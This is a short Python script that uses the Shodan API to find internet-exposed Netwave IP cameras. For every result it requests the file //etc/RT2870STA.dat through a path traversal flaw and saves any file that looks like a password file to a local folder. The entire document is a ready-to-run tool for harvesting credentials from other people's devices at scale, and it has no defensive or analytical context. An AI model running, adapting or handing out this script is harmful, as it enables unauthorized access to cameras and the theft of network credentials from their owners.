#!/usr/bin/env python
#
# uc-http.py
# Search SHODAN for uc-http path traversial.
#
# Author: random_robbie

import shodan
import json
import requests
import sys

# Configuration
API_KEY = "YOURSHODANAPIKEY"
SEARCH_FOR = 'Server: Netwave IP Camera'

session = requests.Session()

def grab_file (IP,PORT):
	try:
		print ("[*] Testing: "+IP+" on Port: "+PORT+" [*]")
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
		response = session.get("http://"+IP+":"+PORT+"//etc/RT2870STA.dat", headers=headers, timeout=15)
		if '[Default]' in response.text:
			print ("[*]Got Password File ... Logging to file.[*]")
			text_file = open("./found/"+IP+" - netwave.txt", "a")
			text_file.write(""+response.text+"\n")
			text_file.close()
		else:
			print ("[*] Not Vunerable. [*]")
	except requests.exceptions.Timeout:
		print ("[*] "+IP+" Timeout unable to connect [*]")
	except Exception as e:
		print('Error: %s' % e)



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = str(service['ip_str'])
				PORT = str(service['port'])
				grab_file (IP,PORT)

				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)